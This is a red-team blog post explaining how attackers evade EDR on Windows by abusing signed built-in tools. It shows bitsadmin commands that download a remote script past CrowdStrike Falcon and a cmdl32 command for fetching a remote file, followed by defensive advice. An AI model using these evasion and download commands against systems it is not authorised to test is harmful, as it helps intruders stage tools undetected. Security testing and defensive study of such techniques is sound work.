---
title: Living off the Land
author: TDSSEC
date: 2022-08-04 00:34:00 +0800
categories: [Red Team, Living Off the Land]
tags: [Red Team]
---
# Avoiding EDR/MDR Detection
You may have heard the term **‘living off the land’** where attackers that have compromised a device within your network will try to evade being discovered or blocked by your security solutions. Perhaps you have an EDR/MDR solution, logging capabilities, or even your own Security Operations Centre (SOC) keeping an eye out for intruders. But is this enough?

Attackers that are living off the land realize that today’s security solutions are constantly evolving, monitoring processes and programs being executed in real-time, sandboxing the unknown, and looking to see if anything malicious could be happening. So what happens if a known vendor signed process or program is executed? Will your security solution detect if something malicious is secretly happening?

On many engagements which utilize **Windows Operating Systems**, it has been possible to evade detection of Antivirus, as well as EDR solutions, including **Windows Defender** and **CrowdStrike Falcon** by leveraging Microsoft signed and verified tools that reside on the system.

### The LOLBAS-Project
> [Scripts, Binaries and Libraries](https://lolbas-project.github.io/#)

## Examples
> Windows 10 x64 Machine  
Crowdstrike Falcon MDR installed

For example, if an attacker tries to download or copy a malicious file to a compromised machine using FTP, a web browser, a PowerShell or CMD command, the chances of this being detected can be extremely high. Especially when the file to be downloaded is a PowerShell script from GitHub which assists with Active Directory enumeration...

![Attempted download of external resource via Web Browser](/2022-08-04-living-off-the-land/access-denied.png){: width="500" height="102"}

To evade detection, one _built-in_ tool that _may_ be leveraged is the **_bitsadmin_** tool, used for managing background transfers.

You can find this tool in the following file paths:

    C:\Windows\System32\bitsadmin.exe
    C:\Windows\SysWOW64\bitsadmin.exe

In this scenario, it was possible to successfully download the PowerShell script from GitHub, executing a command similar to:

`bitsadmin /create 1 bitsadmin /addfile 1 file-URL save-location`  
`bitsadmin /RESUME 1 bitsadmin /complete 1`

![Attempted download of external resource via Web Browser](/2022-08-04-living-off-the-land/bitsadmin.png){: width="500" height="102"}  

There are many other tools that can be used here. Another example is `cmdl32.exe` which by default is located here:

    C:\Windows\System32\cmdl32.exe
    C:\Windows\SysWOW64\cmdl32.exe

An attacker may be able to issue a CMD command as such to download a file from a remote host whilst evading the EDR solution which believes only a legitimate process is running.

A command as simple as:

`cmdl32 /vpn /lan %cd%\config`

## Conclusion

With there being just a few examples, what are the recommendations?

1. First, have security audits and red team scenarios executed. The goal in mind is to identify methods attackers can use to evade your existing security controls.

2. Secondly, review your logging and monitoring procedures. Ensure that also built-in tools that are signed by Microsoft are being added to the watch lists.

3. Last of all, not just one solution may be enough to stop the most experienced of attackers. Defense in depth is recommended, so having multiple security solutions in place might just help keep you one step in front.
